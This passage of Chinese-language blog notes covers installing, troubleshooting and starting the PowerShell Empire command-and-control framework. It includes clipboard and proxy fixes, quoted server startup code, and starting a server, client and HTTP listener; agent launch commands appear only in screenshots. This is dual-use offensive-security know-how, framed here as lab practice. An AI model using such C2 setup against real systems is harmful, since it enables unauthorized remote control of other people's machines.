utility.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> apt-get</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> xclip</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # to install the xclip utility.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">pip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> gtk</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # to install the gtk Python module.</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">pip</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> PyQt4</span><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"> # to install the PyQt4 Python module.</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>相应的进行处理</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">apt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> xsel</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051552537.png" alt="image-20230905155233450"></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">apt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> xclip</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051553222.png" alt="image-20230905155311091"></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;"># 如下步骤操作后发现是不需要的</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> PYTHON_KEYRING_BACKEND</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">keyring</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">backends</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">null</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">Keyring</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">poetry</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> gtk</span></span>
<span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">poetry</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> add</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> PyQt4</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051558148.png" alt="image-20230905155839004"></p><p>看到这里报错没找到就去翻了下为什么, 然后发现 gtk py 包的全名是 pygtk, 而且只支持 python2, 而 pyqt 已经出到 6 了, 感觉也和剪贴板没啥关系, 就不装了</p><p>再试一下生成上线命令发现还是一样的报错, 猜测可能是没加载到啥配置之类的, 重启了下主机</p><p>重启完主机后起 server 的时候发现连不上数据库, 还需要手动启动下 mysql</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051618898.png" alt="image-20230905161835804"></p><p>以及需要等 Starkiller 启动才能起 client, 否则会连不上</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051622312.png" alt="image-20230905162249249"></p><p>这就比较头疼了, 要拉更新, 太慢了, 挂下代理吧</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">export</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;"> https_proxy</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">http</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">://</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">127</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">.</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">1</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span><span style="--shiki-light:#E45649;--shiki-dark:#E06C75;">7890</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p>然后就能成功运行了</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051624297.png" alt="image-20230905162416231"></p><p>不过这个代理感觉可能会影响部分功能, 下掉再重启试试:</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">unset</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> https_proxy</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051626227.png" alt="image-20230905162619135"></p><p>成功起来了, 不过感觉总是这样的话并不是个好办法, 看看有没有啥参数能跳过 Starkiller 更新, 循着 <code>./ps-empire</code> 一步步找找:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051628355.png" alt="image-20230905162810317"></p><p>指向 <code>empire.py</code> 主程序:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051628833.png" alt="image-20230905162835778"></p><p>调用了 <code>empire.empire.server.run(args)</code> 来启动 server</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051638650.png" alt="image-20230905163816595"></p><p>函数全文如下:</p><div class="language-python line-numbers-mode" data-highlighter="shiki" data-ext="python" data-title="python" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">def</span><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;"> run</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#D19A66;--shiki-dark-font-style:italic;">args</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">    setup_logging</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(args)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">    check_submodules</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">    check_recommended_configuration</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> not</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.restport:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        args.restport </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> 1337</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        args.restport </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> int</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(args.restport[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">])</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> not</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.restip:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        args.restip </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;0.0.0.0&quot;</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        args.restip </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.restip[</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">0</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">]</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.version:</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        # log to stdout instead of stderr</span></span>
<span class="line"><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">        print</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(empire.</span><span style="--shiki-light:#383A42;--shiki-dark:#D19A66;">VERSION</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        sys.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    elif</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> args.reset:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        choice </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;"> input</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span></span>
<span class="line"><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">            &quot;</span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\x1b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">[1;33m[&gt;] Would you like to reset your Empire Server instance? [y/N]: </span><span style="--shiki-light:#0184BC;--shiki-dark:#56B6C2;">\x1b</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">[0m&quot;</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        )</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> choice.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">lower</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">() </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">==</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> &quot;y&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">            reset</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        sys.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">    else</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        base.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">startup_db</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        global</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> main</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        # Calling run more than once, such as in the test suite</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        # Will generate more instances of MainMenu, which then</span></span>
<span class="line"><span style="--shiki-light:#A0A1A7;--shiki-light-font-style:italic;--shiki-dark:#7F848E;--shiki-dark-font-style:italic;">        # causes shutdown failure.</span></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        if</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> main </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">is</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;"> None</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">:</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            main </span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> empire.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">MainMenu</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">args</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">args)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        if</span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;"> not</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> os.path.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exists</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;./empire/server/data/empire-chain.pem&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">):</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            log.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">info</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;Certificate not found. Generating...&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            subprocess.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">call</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;">&quot;./setup/cert.sh&quot;</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">            time.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">sleep</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-dark:#D19A66;">3</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">        from</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> empire.server.api </span><span style="--shiki-light:#A626A4;--shiki-dark:#C678DD;">import</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;"> app</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">        app.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">initialize</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">(</span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">secure</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">args.secure_api, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">ip</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">args.restip, </span><span style="--shiki-light:#986801;--shiki-light-font-style:inherit;--shiki-dark:#E06C75;--shiki-dark-font-style:italic;">port</span><span style="--shiki-light:#383A42;--shiki-dark:#56B6C2;">=</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">args.restport)</span></span>
<span class="line"></span>
<span class="line"><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">    sys.</span><span style="--shiki-light:#383A42;--shiki-dark:#61AFEF;">exit</span><span style="--shiki-light:#383A42;--shiki-dark:#ABB2BF;">()</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div><p>可惜的是没有参数能控制是否更新 Starkiller, 继续向下看 <code>app.initialize</code></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051642808.png" alt="image-20230905164224683"></p><p>根据 log 信息与代码定位到更新 Starkiller 的代码在 <code>sync_starkiller</code>:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051645388.png" alt="image-20230905164524327"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051646302.png" alt="image-20230905164650213"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051647016.png" alt="image-20230905164728960"></p><p>找到了:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051654486.png" alt="image-20230905165429386"></p><p>配置在调用 sync_starkiller 传入了, 在捋一下来源找到了如下文件：</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051655641.png" alt="image-20230905165556526"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051655103.png" alt="image-20230905165527997"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051656229.png" alt="image-20230905165648165"></p><p>看样子还是可以传入参配置文件控制的, 默认的配置在这里:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051710319.png" alt="image-20230905171036243"></p><p>如果要自定义的话可以拷贝一份默认配置, 例如:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051722888.png" alt="image-20230905172215794"></p><p>这样就不用更新了, 不过直接改默认配置更方便, 之后需要更新的时候可以再改回来</p><hr><p>然后在 client 端成功生成了上线命令:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309051816388.png" alt="image-20230905181654321"></p><p>可以看到能成功复制了</p><blockquote><p>不过后续使用的时候发现有时又不能复制了, 又是一样的报错, 感觉有可能是因为我 ssh 连上去之后拷贝要跨机子所以报错了? 不过反正也不影响, 直接手动拷贝也可以</p></blockquote><hr><p>上线个机子试试:</p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202309052158989.png" alt="image-20230905215617525"></p><hr><h3 id="kali" tabindex="-1"><a class="header-anchor" href="#kali"><span>Kali</span></a></h3><p>Kali 上可以直接通过 <code>apt</code> 安装 <code>powershell-empire</code></p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">sudo</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> apt</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> install</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> powershell-empire</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><hr><h3 id="demo" tabindex="-1"><a class="header-anchor" href="#demo"><span>Demo</span></a></h3><blockquote><p><a href="https://www.youtube.com/watch?v=wsSox64GqIU&amp;t=635s" target="_blank" rel="noopener noreferrer">PBSC CyberWeek 2022 PowerShell Empire Demo - YouTube</a></p></blockquote><hr><h4 id="拓扑" tabindex="-1"><a class="header-anchor" href="#拓扑"><span>拓扑</span></a></h4><!--[--><div class="mermaid-actions"><button class="preview-button" title="preview"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1316 1024" fill="currentColor"><path d="M658.286 0C415.89 0 0 297.106 0 512c0 214.82 415.89 512 658.286 512 242.322 0 658.285-294.839 658.285-512S900.608 0 658.286 0zm0 877.714c-161.573 0-512-221.769-512-365.714 0-144.018 350.427-365.714 512-365.714 161.572 0 512 217.16 512 365.714s-350.428 365.714-512 365.714z"/><path d="M658.286 292.571a219.429 219.429 0 1 0 0 438.858 219.429 219.429 0 0 0 0-438.858zm0 292.572a73.143 73.143 0 1 1 0-146.286 73.143 73.143 0 0 1 0 146.286z"/></svg></button><button class="download-button" title="download"><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 1024 1024" fill="currentColor"><path d="M828.976 894.125H190.189c-70.55 0-127.754-57.185-127.754-127.753V606.674c0-17.634 14.31-31.933 31.933-31.933h63.889c17.634 0 31.932 14.299 31.932 31.933v95.822c0 35.282 28.596 63.877 63.877 63.877h511.033c35.281 0 63.877-28.595 63.877-63.877v-95.822c0-17.634 14.298-31.933 31.943-31.933h63.878c17.635 0 31.933 14.299 31.933 31.933v159.7c0 70.566-57.191 127.751-127.754 127.751zM249.939 267.51c12.921-12.92 33.885-12.92 46.807 0l148.97 148.972V94.893c0-17.634 14.302-31.947 31.934-31.947h63.876c17.638 0 31.946 14.313 31.946 31.947v321.589l148.97-148.972c12.922-12.92 33.876-12.92 46.797 0l46.814 46.818c12.922 12.922 12.922 33.874 0 46.807L552.261 624.93c-1.14 1.138-21.664 13.684-42.315 13.693-20.877.01-41.88-12.542-43.021-13.693L203.122 361.135c-12.923-12.934-12.923-33.885 0-46.807l46.817-46.818z"/></svg></button></div><div class="mermaid-wrapper"><div class="loading-icon-wrapper mermaid-loading" style="display:flex;align-items:center;justify-content:center;height:96px;"><svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" preserveAspectRatio="xMidYMid" viewBox="25 25 50 50"><animateTransform attributeName="transform" type="rotate" dur="2s" keyTimes="0;1" repeatCount="indefinite" values="0;360"></animateTransform><circle cx="50" cy="50" r="20" fill="none" stroke="currentColor" stroke-width="4" stroke-linecap="round"><animate attributeName="stroke-dasharray" dur="1.5s" keyTimes="0;0.5;1" repeatCount="indefinite" values="1,200;90,200;1,200"></animate><animate attributeName="stroke-dashoffset" dur="1.5s" keyTimes="0;0.5;1" repeatCount="indefinite" values="0;-35px;-125px"></animate></circle></svg></div></div><!--]--><hr><h4 id="起-server" tabindex="-1"><a class="header-anchor" href="#起-server"><span>起 server</span></a></h4><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">powershell-empire</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> server</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282241575.png" alt="image-20230528224109503"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282241083.png" alt="image-20230528224140004"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282241665.png" alt="image-20230528224154585"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282242695.png" alt="image-20230528224209617"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282242881.png" alt="image-20230528224218807"></p></blockquote><hr><h4 id="起-client" tabindex="-1"><a class="header-anchor" href="#起-client"><span>起 Client</span></a></h4><p>新开一个 bash 起 client</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro vp-code"><code><span class="line"><span style="--shiki-light:#4078F2;--shiki-dark:#61AFEF;">powershell-empire</span><span style="--shiki-light:#50A14F;--shiki-dark:#98C379;"> client</span></span></code></pre><div class="line-numbers" aria-hidden="true" style="counter-reset:line-number 0;"><div class="line-number"></div></div></div><blockquote><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282237135.png" alt="image-20230528223724063"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282237526.png" alt="image-20230528223748461"></p><p><img src="http://cdn.ayusummer233.top/DailyNotes/202305282238639.png" alt="image-20230528223804570"></p><hr></blockquote><hr><h4 id="新建一个-http-listener" tabindex="-1"><a class="header-anchor" href="#新建一个-http-listener"><span>新建一个 http listener</span></a></h4><p>起一个 http listener</p><div class="language-bash line-numbers-mode" data-highlighter="shiki" data-ext="bash" data-title="bash" style="--shiki-light:#383A42;--shiki-dark:#abb2bf;--shiki-light-bg:#FAFAFA;--shiki-dark-bg:#282c34;"><pre class="shiki shiki-themes one-light one-dark-pro 